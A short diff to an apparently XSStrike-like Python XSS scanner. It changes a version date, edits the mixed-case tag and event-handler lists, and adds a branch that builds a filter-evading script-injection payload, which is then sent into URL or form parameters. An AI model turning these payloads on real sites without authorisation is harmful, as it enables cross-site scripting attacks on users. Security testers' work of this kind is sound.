@@ -32,7 +32,7 @@ br.set_handle_referer(True) # Include referrer
 br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
 ('Accept-Encoding', 'deflate'), ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')]
 
-date = '09-03-2018'
+date = '14-03-2018'
 
 def update():
     print '%s Checking for updates...' % run
@@ -64,7 +64,7 @@ delay = 0
 tags = ['sVg', 'iMg', 'bOdY', 'd3v', 'deTails'] # HTML Tags
 
 event_handlers = { # Event handlers and the name of tags which can be used with them
-'oNeRror': ['sVg', 'iMg', 'viDeo'],
+'oNeRror': ['OBjEct', 'iMg', 'viDeo'],
 'oNloAd': ['sVg', 'bOdY'],
 'oNsTart': ['maRQuee'],
 'oNMoUseOver': ['d3v', 'IfRame', 'bOdY'],
@@ -564,6 +564,8 @@ def inject(url, param_data, GET, POST):
                             sys.stdout.flush()
                             if event_handler == 'oNeRror':
                                 payload = '%s%s%s%s%s%s%s%s%s=%s%s%s%s' % (l_than, tag, filling, 'sRc=', e_filling, '=', e_filling, event_handler, e_filling, e_filling, function, l_filling, g_than)
+                            elif tag == 'd3v':
+                                payload = '%s%s%s%s%s%s=%s%s%s%sthis' % (l_than, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, g_than)
                             else:
                                 payload = '%s%s%s%s%s%s=%s%s%s%s' % (l_than, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, g_than)
                             test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
